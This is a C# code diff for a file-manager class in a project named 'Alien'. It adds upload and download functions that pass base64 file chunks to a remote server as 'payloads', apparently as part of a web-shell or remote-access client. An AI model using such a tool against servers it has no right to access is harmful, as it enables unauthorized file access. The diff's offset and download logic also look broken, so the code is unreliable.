@@ -1,12 +1,13 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Runtime.CompilerServices;
 using System.Text;
 using System.Threading.Tasks;
 
 namespace Alien
 {
-    internal class clsfnFileMgr
+    public class clsfnFileMgr
     {
         private clsWeb m_web { get; set; }
         public string m_szFolderPath { get; set; }
@@ -232,14 +233,74 @@ namespace Alien
             }
         }
 
-        public async Task<bool> fnbAppendBytes(byte[] abBuffer)
+        public async Task<bool> fnbFileUpload(string szSrcFilePath, string szDstFilePath, Action fnCallback = null)
         {
-            return true;
+            try
+            {
+                using (FileStream fs = File.OpenRead(szSrcFilePath))
+                {
+                    int nChunkSize = 1024 * 5;
+                    byte[] abBuffer = new byte[nChunkSize];
+                    int nRead = 0;
+
+                    while ((nRead = fs.Read(abBuffer, 0, abBuffer.Length)) > 0)
+                    {
+                        string szResp = await m_web.fnszSendPayload("file_uf", new string[]
+                        {
+                        szDstFilePath, //Destination file path.
+                        nRead.ToString(), //File object seek offset.
+                        Convert.ToBase64String(abBuffer), //File bytes in base64
+                        });
+                    }
+
+                    if (fnCallback != null)
+                        fnCallback();
+                }
+
+                return true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "fnbFileUpload", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return false;
+            }
         }
 
-        public async Task<byte[]> fnabReadBytes()
+        public async Task<bool> fnbFileDownload(string szRemoteFilePath, string szLocalFilePath, Action fnCallback = null)
         {
-            return new byte[1024];
+            try
+            {
+                using (FileStream fs = File.OpenWrite(szLocalFilePath))
+                {
+                    int nChunkSize = 1024 * 5;
+                    byte[] abBuffer = new byte[nChunkSize];
+                    int nOffset = 0;
+                    string szResp = string.Empty;
+
+                    do
+                    {
+                        szResp = await m_web.fnszSendPayload("file_df", new string[]
+                        {
+                            szRemoteFilePath,
+                            nChunkSize.ToString(),
+                            nOffset.ToString(),
+                        });
+
+                        nOffset++;
+                    }
+                    while (szResp.StartsWith("ERROR://") || szResp == "-1");
+
+                    if (fnCallback != null)
+                        fnCallback();
+                }
+
+                return true;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "fnbFileDownload", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return false;
+            }
         }
     }
 }
